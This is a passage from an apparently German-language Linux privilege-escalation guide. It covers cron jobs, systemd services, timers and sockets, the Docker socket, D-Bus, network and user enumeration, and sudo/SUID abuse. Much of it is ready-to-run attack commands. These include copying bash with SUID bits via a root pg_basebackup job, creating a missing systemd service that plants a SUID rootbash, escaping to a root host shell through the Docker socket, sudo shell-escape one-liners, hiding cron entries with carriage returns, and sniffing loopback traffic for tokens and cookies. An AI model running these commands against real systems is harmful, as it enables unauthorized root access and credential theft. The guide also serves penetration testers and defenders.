Ein normaler Benutzer, der die exakt von einem Root-Cronjob ausgeführte Binary beschreiben kann, kann eine Privilegiengrenze überwinden. Eine benutzerdefinierte Signaturprüfung kann jedoch einen unsignierten Ersatz zurückweisen. Im dokumentierten Fall hatte die Root-eigene ELF-Datei den Modus `0760`, sodass ein Mitglied ihrer Gruppe sie beschreiben konnte, während der Root-Eigentümer sie ausführen konnte. Eine sichtbare Prozessverfolgung zeigte, dass `objcopy` vor der Ausführung der Binary durch den Job `.text_sig` extrahierte; das vollständige Verifizierungs-Skript war nicht lesbar.<sup>[[2]](#references)</sup>

Der erfolgreiche Ersatz wurde mit geleaktem privatem Signaturmaterial und einem ELF-Signer signiert. Die [Formatdokumentation](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) beschreibt einen Signaturabschnitt, der aus dem `.text` der ausführbaren Datei abgeleitet wird. Es ist nicht belegt, dass das bloße Hinzufügen eines Zertifikats oder einer passenden Zeichenfolge zu `.text_sig` die unbekannte Verifizierungsprüfung besteht. Prüfe den tatsächlich geplanten Pfad, die effektiven Schreibrechte, den Root-Aufruf und die Verifizierungsrichtlinie, bevor du zu dem Schluss kommst, dass eine beschreibbare signierte Binary ausnutzbar ist. Ein `.text_sig`-Abschnitt allein ist lediglich ein Hinweis für die Überprüfung.

### Häufige Cronjobs

Du kannst die Prozesse überwachen, um nach Prozessen zu suchen, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht kannst du das ausnutzen, um deine Privilegien zu erhöhen.

Zum Beispiel kannst du **jede 0,1 s eine Minute lang überwachen**, **nach den am seltensten ausgeführten Befehlen sortieren** und die am häufigsten ausgeführten Befehle löschen:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Du kannst auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) verwenden (damit werden alle gestarteten Prozesse überwacht und aufgelistet).

### Root-Backups, die vom Angreifer gesetzte Mode-Bits beibehalten (pg_basebackup)

Wenn ein Root-eigener Cronjob `pg_basebackup` (oder einen rekursiven Kopiervorgang) auf ein Datenbankverzeichnis anwendet, in das du schreiben kannst, kannst du eine **SUID/SGID-Binärdatei** platzieren, die mit denselben Mode-Bits als **root:root** in die Backup-Ausgabe kopiert wird.<sup>[[26]](#references)</sup>

Typischer Erkennungsablauf (als DB-Benutzer mit niedrigen Rechten):
- Verwende `pspy`, um einen Root-Cronjob zu entdecken, der jede Minute etwas wie `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` aufruft.
- Bestätige, dass der Quellcluster (z. B. `/var/lib/postgresql/14/main`) für dich beschreibbar ist und das Ziel (`/opt/backups/current`) nach dem Job Root gehört.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Dies funktioniert, weil `pg_basebackup` beim Kopieren des Clusters die Dateimodus-Bits beibehält; wird es von root aufgerufen, übernehmen die Zieldateien **root-Eigentümerschaft + vom Angreifer gewähltes SUID/SGID**. Jede ähnliche privilegierte Backup-/Kopierroutine, die Berechtigungen beibehält und in einen ausführbaren Speicherort schreibt, ist anfällig.

### Unsichtbare Cronjobs

Es ist möglich, einen Cronjob zu erstellen, indem **nach einem Kommentar ein Wagenrücklauf eingefügt wird** (ohne Zeilenumbruchzeichen). Der Cronjob wird trotzdem ausgeführt. Beispiel (beachten Sie das Wagenrücklaufzeichen):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Um diese Art von verborgenem Einstieg zu erkennen, untersuche Cron-Dateien mit Tools, die Steuerzeichen sichtbar machen:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Dienste

### Beschreibbare _.service_-Dateien

Prüfe, ob du in eine `.service`-Datei schreiben kannst. Falls ja, **könntest du sie ändern**, sodass sie deine **Backdoor ausführt, wenn** der Dienst **gestartet**, **neu gestartet** oder **beendet** wird (vielleicht musst du warten, bis der Rechner neu gestartet wird).\
Erstelle deine Backdoor beispielsweise in der .service-Datei mit **`ExecStart=/tmp/script.sh`**

### Beschreibbare Dienst-Binaries

Beachte: Wenn du **Schreibberechtigungen für Binaries hast, die von Diensten ausgeführt werden**, kannst du sie durch Backdoors ersetzen. Werden die Dienste dann erneut ausgeführt, werden die Backdoors ausgeführt.

### systemd-PATH – Relative Pfade

Du kannst den von **systemd** verwendeten PATH anzeigen mit:

```bash
systemctl show-environment
```

Wenn du feststellst, dass du in einen der Ordner im Pfad **schreiben** kannst, kannst du möglicherweise deine **Berechtigungen erweitern**. Suche nach **relativen Pfaden, die in Dienstkonfigurationsdateien verwendet werden**, wie zum Beispiel:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Erstelle dann eine **ausführbare Datei** mit **demselben Namen wie die Binärdatei im relativen Pfad** innerhalb des systemd-PATH-Ordners, in den du schreiben kannst. Wenn der Dienst die verwundbare Aktion (**Start**, **Stop**, **Reload**) ausführen soll, wird deine **Backdoor ausgeführt** (unprivilegierte Benutzer können Dienste normalerweise nicht starten oder stoppen, aber prüfe mit `sudo -l`, ob du es kannst).

**Weitere Informationen zu Diensten findest du unter `man systemd.service`.**

## **Timer**

**Timer** sind systemd-Unit-Dateien, deren Name auf `**.timer**` endet und die `**.service**`-Dateien oder Ereignisse steuern. **Timer** können als Alternative zu cron verwendet werden, da sie integrierte Unterstützung für kalenderbasierte und monotone Zeitereignisse bieten und asynchron ausgeführt werden können.

Du kannst alle Timer mit folgendem Befehl auflisten:

```bash
systemctl list-timers --all
```

### Schreibbare Timer

Wenn du einen Timer ändern kannst, kannst du ihn dazu bringen, einige Einheiten von systemd.unit auszuführen (z. B. eine `.service` oder ein `.target`).

```bash
Unit=backdoor.service
```

In der Dokumentation können Sie nachlesen, was die Unit ist:

> Die Unit, die aktiviert wird, wenn dieser Timer abläuft. Das Argument ist ein Unit-Name ohne das Suffix „.timer“. Falls nicht angegeben, wird standardmäßig ein Service aktiviert, der denselben Namen wie die Timer-Unit hat, abzüglich des Suffixes. (Siehe oben.) Es wird empfohlen, dass die Namen der aktivierten Unit und der Timer-Unit bis auf das Suffix identisch sind.

Um diese Berechtigung auszunutzen, müssten Sie daher:

- Eine systemd-Unit (z. B. eine `.service`) finden, die **eine beschreibbare Binärdatei ausführt**
- Eine systemd-Unit finden, die **einen relativen Pfad ausführt**, und **Schreibrechte** auf den **systemd PATH** haben (um sich als diese ausführbare Datei auszugeben)

**Erfahren Sie mehr über Timer mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren, benötigen Sie Root-Rechte und müssen Folgendes ausführen:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Beachte: Der **timer** wird **aktiviert**, indem ein Symlink darauf unter `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` erstellt wird.

## Sockets

Unix Domain Sockets (UDS) ermöglichen die **Prozesskommunikation** auf demselben oder auf verschiedenen Rechnern innerhalb von Client-Server-Modellen. Sie verwenden standardmäßige Unix-Deskriptordateien für die Kommunikation zwischen Rechnern und werden über `.socket`-Dateien eingerichtet.<sup>[[14]](#references)</sup>

Sockets können mit `.socket`-Dateien konfiguriert werden.

**Weitere Informationen zu Sockets findest du unter `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen unterscheiden sich, geben aber zusammengefasst an, **wo der Socket auf Verbindungen wartet** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6-Adresse und/oder die Portnummer, an der gelauscht werden soll usw.).
- `Accept`: Akzeptiert ein boolesches Argument. Bei **true** wird für jede eingehende Verbindung eine **Service-Instanz gestartet**, an die nur der Verbindungssocket übergeben wird. Bei **false** werden alle lauschenden Sockets selbst an die **gestartete Service-Unit übergeben**, und für alle Verbindungen wird nur eine Service-Unit gestartet. Dieser Wert wird bei Datagram-Sockets und FIFOs ignoriert, bei denen eine einzelne Service-Unit bedingungslos den gesamten eingehenden Datenverkehr verarbeitet. **Der Standardwert ist false**. Aus Performancegründen wird empfohlen, neue Daemons nur so zu schreiben, dass sie für `Accept=no` geeignet sind.
- `ExecStartPre`, `ExecStartPost`: Akzeptieren eine oder mehrere Befehlszeilen, die jeweils **vor** oder **nach dem Erstellen und Binden** der lauschenden **Sockets**/FIFOs **ausgeführt werden**. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, auf den die Argumente für den Prozess folgen.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die jeweils **vor** oder **nach dem Schließen und Entfernen** der lauschenden **Sockets**/FIFOs **ausgeführt werden**.
- `Service`: Gibt den Namen der **Service-Unit an, die bei eingehendem Datenverkehr aktiviert werden soll**. Diese Einstellung ist nur für Sockets mit Accept=no zulässig. Standardmäßig wird die Service-Unit mit demselben Namen wie der Socket verwendet (wobei das Suffix ersetzt wird). In den meisten Fällen sollte diese Option nicht nötig sein.

### Beschreibbare .socket-Dateien

Wenn du eine **beschreibbare** `.socket`-Datei findest, kannst du am Anfang des Abschnitts `[Socket]` etwas wie `ExecStartPre=/home/kali/sys/backdoor` **hinzufügen**. Dann wird die backdoor ausgeführt, bevor der Socket erstellt wird. Daher musst du **wahrscheinlich warten, bis der Rechner neu gestartet wird.**\
_Beachte, dass das System die Konfiguration dieser Socket-Datei verwenden muss, sonst wird die backdoor nicht ausgeführt._

### Socket-Aktivierung + beschreibbarer Unit-Pfad (fehlende Service-Unit erstellen)

Eine weitere schwerwiegende Fehlkonfiguration liegt vor, wenn:

- eine Socket-Unit `Accept=no` und `Service=<name>.service` verwendet
- die referenzierte Service-Unit fehlt
- ein Angreifer in `/etc/systemd/system` (oder einen anderen Unit-Suchpfad) schreiben kann

In diesem Fall kann der Angreifer `<name>.service` erstellen und anschließend Datenverkehr an den Socket senden, damit systemd den neuen Service als root lädt und ausführt.

Ablauf in Kürze:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Beschreibbare Sockets

Wenn du **einen beschreibbaren Socket identifizierst** (_hier geht es um Unix Sockets und nicht um die Konfigurationsdateien `.socket`_), kannst du **mit diesem Socket kommunizieren** und möglicherweise eine Schwachstelle ausnutzen.

### Unix Sockets enumerieren

```bash
netstat -a -p --unix
```

### Rohe Verbindung

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exploitation-Beispiel:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP-Sockets

Beachte, dass möglicherweise **Sockets auf HTTP-Anfragen lauschen** (_ich spreche nicht von .socket-Dateien, sondern von Dateien, die als Unix-Sockets fungieren_). Du kannst dies folgendermaßen überprüfen:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Wenn der Socket mit einer HTTP-Anfrage **antwortet**, kannst du **mit ihm kommunizieren** und möglicherweise **eine Schwachstelle ausnutzen**.

### Beschreibbarer Docker-Socket

Der Docker-Socket, der häufig unter `/var/run/docker.sock` zu finden ist, ist eine kritische Datei, die geschützt werden sollte. Standardmäßig ist sie für den Benutzer `root` und Mitglieder der Gruppe `docker` beschreibbar. Schreibzugriff auf diesen Socket kann zu einer Rechteausweitung führen. Hier wird erläutert, wie das möglich ist und welche alternativen Methoden es gibt, wenn die Docker CLI nicht verfügbar ist.

#### **Rechteausweitung mit Docker CLI**

Wenn du Schreibzugriff auf den Docker-Socket hast, kannst du mit den folgenden Befehlen deine Berechtigungen erweitern:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Diese Befehle ermöglichen es dir, einen Container mit Zugriff auf das Dateisystem des Hosts auf Root-Ebene auszuführen.

#### **Direkte Verwendung der Docker-API**

Wenn die Docker-CLI nicht verfügbar ist, kann der Docker-Socket weiterhin über rohe HTTP-Anfragen über den Unix-Socket missbraucht werden. Der zuverlässigste Ablauf ist:

- einen langlebigen Hilfscontainer erstellen, in den das Root-Verzeichnis des Hosts eingebunden ist
- ihn starten
- darin eine `exec`-Instanz erstellen
- die `exec`-Instanz starten und die Ausgabe über die API auslesen

**Docker-Images auflisten**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Erstelle und starte einen Hilfscontainer**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Eine exec-Instanz erstellen**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Starten Sie die exec-Instanz und lesen Sie die Ausgabe**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Dieses Muster ist in der Regel robuster, als `attach` manuell mit `socat` oder `nc -U` auszuführen. Sobald du mit `/:/host` einen Hilfscontainer erstellen kannst, kannst du zusätzliche `exec`-Instanzen verwenden, um Dateien wie `/host/root/...` zu lesen, SSH-Schlüssel unter `/host/root/.ssh` hinzuzufügen oder Startdateien des Hosts zu ändern.

### Sonstiges

Beachte: Wenn du Schreibberechtigungen für den Docker-Socket hast, weil du **Mitglied der Gruppe `docker` bist**, gibt es [**weitere Möglichkeiten zur Rechteausweitung**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Wenn die [**Docker-API an einem Port lauscht**, kannst du sie ebenfalls kompromittieren](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Weitere **Möglichkeiten, aus Containern auszubrechen oder Container-Runtimes für eine Rechteausweitung zu missbrauchen**, findest du unter:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Rechteausweitung mit Containerd (ctr)

Wenn du den Befehl **`ctr`** verwenden kannst, lies die folgende Seite, da du ihn möglicherweise **für eine Rechteausweitung missbrauchen kannst**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Rechteausweitung mit **RunC**

Wenn du den Befehl **`runc`** verwenden kannst, lies die folgende Seite, da du ihn möglicherweise **für eine Rechteausweitung missbrauchen kannst**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgefeiltes **Interprozesskommunikationssystem (IPC)**, das Anwendungen eine effiziente Interaktion und den Datenaustausch ermöglicht. Es wurde mit Blick auf moderne Linux-Systeme entwickelt und bietet ein robustes Framework für verschiedene Formen der Anwendungskommunikation.<sup>[[16]](#references)</sup>

Das System ist vielseitig und unterstützt einfache IPC, die den Datenaustausch zwischen Prozessen verbessert und an **erweiterte UNIX-Domain-Sockets** erinnert. Außerdem ermöglicht es die Verbreitung von Ereignissen oder Signalen und fördert so die nahtlose Integration zwischen Systemkomponenten. Beispielsweise kann ein Signal eines Bluetooth-Daemons über einen eingehenden Anruf einen Musikplayer zum Stummschalten veranlassen und so die Benutzererfahrung verbessern. Zusätzlich unterstützt D-Bus ein Remote-Objektsystem, das Dienstanfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und damit traditionell komplexe Abläufe optimiert.

D-Bus arbeitet nach einem **Allow-/Deny-Modell** und verwaltet Nachrichtenberechtigungen (Methodenaufrufe, Signalübertragungen usw.) auf Grundlage der kumulativen Wirkung zutreffender Richtlinienregeln. Diese Richtlinien legen Interaktionen mit dem Bus fest und können durch das Ausnutzen dieser Berechtigungen möglicherweise eine Rechteausweitung ermöglichen.

Ein Beispiel für eine solche Richtlinie in `/etc/dbus-1/system.d/wpa_supplicant.conf` ist unten aufgeführt. Sie beschreibt die Berechtigungen des root-Benutzers, Nachrichten von `fi.w1.wpa_supplicant1` zu besitzen, an diesen zu senden und von ihm zu empfangen.

Richtlinien ohne angegebenen Benutzer oder Gruppe gelten allgemein, während Richtlinien im „default“-Kontext für alle gelten, die nicht von anderen spezifischen Richtlinien erfasst werden.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Lerne hier, wie man eine D-Bus-Kommunikation enumeriert und exploitet:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu enumerieren und herauszufinden, wo sich die Maschine darin befindet.

### Generische Enumeration

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Wenn ein aktiver Eintrag in `/etc/inetd.conf` GNU Inetutils `telnetd` als root ausführt, prüfe die konfigurierte Binärversion und den lokalen Listener auch dann, wenn der Port nur an Loopback gebunden ist. GNU Inetutils 1.9.3 bis 2.7 waren von einem [Telnet-Authentifizierungs-Bypass](https://seclists.org/oss-sec/2026/q1/89) betroffen, bei dem ein vom Client übermittelter Wert für `USER` an `login -f` weitergegeben wurde (CVE-2026-24061). Ein Prozess oder eine Versionszeichenfolge ist ein Hinweis; bestätige den Patch-Status des Anbieters und prüfe den tatsächlichen Daemon, bevor du ihn als verwundbar einstufst. Der [Telnet-Leitfaden](../../../network-services-pentesting/pentesting-telnet.md) enthält weitere Details.

### Schnelle Triage der ausgehenden Filterung

Wenn der Host Befehle ausführen kann, aber Callbacks fehlschlagen, grenze DNS-, Transport-, Proxy- und Routenfilterung schnell voneinander ab:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Offene Ports

Prüfe immer die auf dem Rechner laufenden Netzwerkdienste, mit denen du vor dem Zugriff nicht interagieren konntest:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Listener nach Bind-Ziel klassifizieren:

- `0.0.0.0` / `[::]`: auf allen lokalen Schnittstellen erreichbar.
- `127.0.0.1` / `::1`: nur lokal erreichbar (gute Kandidaten für tunnel/forward).
- Bestimmte interne IPs (z. B. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): normalerweise nur aus internen Segmenten erreichbar.

### Triage-Workflow für nur lokal erreichbare Dienste

Wenn du einen Host übernimmst, sind Dienste, die an `127.0.0.1` gebunden sind, oft erstmals von deiner Shell aus erreichbar. Ein schneller lokaler Workflow sieht so aus:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS als Netzwerkscanner (Nur-Netzwerk-Modus)

Neben lokalen PE-Prüfungen kann linPEAS als fokussierter Netzwerkscanner ausgeführt werden. Es verwendet verfügbare Binärdateien in `$PATH` (typischerweise `fping`, `ping`, `nc`, `ncat`) und installiert keine Tools.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Wenn Sie `-d`, `-p` oder `-i` ohne `-t` angeben, verhält sich linPEAS wie ein reiner Netzwerkscanner (die übrigen Privilege-Escalation-Prüfungen werden übersprungen).

### Sniffing

Prüfen Sie, ob Sie Traffic sniffen können. Wenn ja, können Sie möglicherweise Zugangsdaten abgreifen.

```
timeout 1 tcpdump
```

Schnelle praktische Überprüfungen:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) ist bei der Post-Exploitation besonders wertvoll, da viele nur intern erreichbare Dienste dort Tokens/Cookies/Credentials offenlegen:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Jetzt mitschneiden, später parsen:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Benutzer

### Allgemeine Enumeration

Prüfe, **wer** du bist, über welche **Berechtigungen** du verfügst, welche **Benutzer** sich auf den Systemen befinden, welche sich **anmelden** können und welche **root-Rechte** haben:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Große UID

Einige Linux-Versionen waren von einem Bug betroffen, der es Benutzern mit **UID > INT_MAX** ermöglicht, ihre Berechtigungen zu erweitern. Weitere Informationen: [hier](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hier](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) und [hier](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploit it** mit: **`systemd-run -t /bin/bash`**

### Gruppen

Prüfe, ob du **Mitglied einer Gruppe bist**, die dir Root-Rechte verschaffen könnte:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Prüfe, ob sich etwas Interessantes in der Zwischenablage befindet (falls möglich)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Kennwortrichtlinie

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Bekannte Passwörter

Wenn du **ein Passwort** der Umgebung **kennst, versuche, dich mit diesem Passwort als jeder Benutzer anzumelden**.

### Su Brute

Wenn dir viel Lärm nichts ausmacht und die Binärdateien `su` und `timeout` auf dem Computer vorhanden sind, kannst du versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) per Brute-Force anzugreifen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) versucht mit dem Parameter `-a` ebenfalls, Benutzer per Brute-Force anzugreifen.

## Missbrauch beschreibbarer PATH-Verzeichnisse

### $PATH

Wenn du **in ein Verzeichnis aus $PATH schreiben kannst**, kannst du möglicherweise deine Berechtigungen erhöhen, indem du **im beschreibbaren Verzeichnis eine Backdoor erstellst**, die den Namen eines Befehls trägt, der von einem anderen Benutzer (idealerweise root) ausgeführt wird und **nicht aus einem Verzeichnis geladen wird, das in $PATH vor deinem beschreibbaren Verzeichnis steht**.

### SUDO und SUID

Möglicherweise darfst du bestimmte Befehle mit sudo ausführen, oder sie haben das SUID-Bit gesetzt. Überprüfe dies mit:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Einige **unerwartete Befehle ermöglichen es, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen**.<sup>[[8]](#references)</sup> Zum Beispiel:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Die Sudo-Konfiguration kann einem Benutzer erlauben, bestimmte Befehle mit den Rechten eines anderen Benutzers auszuführen, ohne dessen Passwort zu kennen.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen. Nun ist es trivial, eine shell zu erhalten, indem man einen SSH-Schlüssel zum root-Verzeichnis hinzufügt oder `sh` aufruft.

```
sudo vim -c '!sh'
```

### Nicht in Anführungszeichen gesetzter Bash-Vergleich in einem sudo-Skript

In Bash ist die rechte Seite von `[[ "$protected" == $candidate ]]` ein Muster. Wenn ein sudo-Skript mit Root-Rechten `candidate` aus einer vom Aufrufer kontrollierten Datei bezieht, kann ein Wert wie `prefix*` zum Anfang einer geschützten Zeichenfolge passen. Unterschiedliche Erfolgs- und Fehlerpfade können dann ein Präfix-Orakel offenlegen. Wenn eine wörtliche Gleichheit beabsichtigt ist, setze die rechte Seite in Anführungszeichen (`[[ "$protected" == "$candidate" ]]`). Prüfe die tatsächlichen sudo-Argumente, die Herkunft der Eingabe und das beobachtbare Verhalten der Verzweigungen, bevor du einen Vergleich ohne Anführungszeichen als ausnutzbar einstufst. Das Musterverhalten ist im [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) beschrieben.

### PrusaSlicer-Projektdateien unter sudo

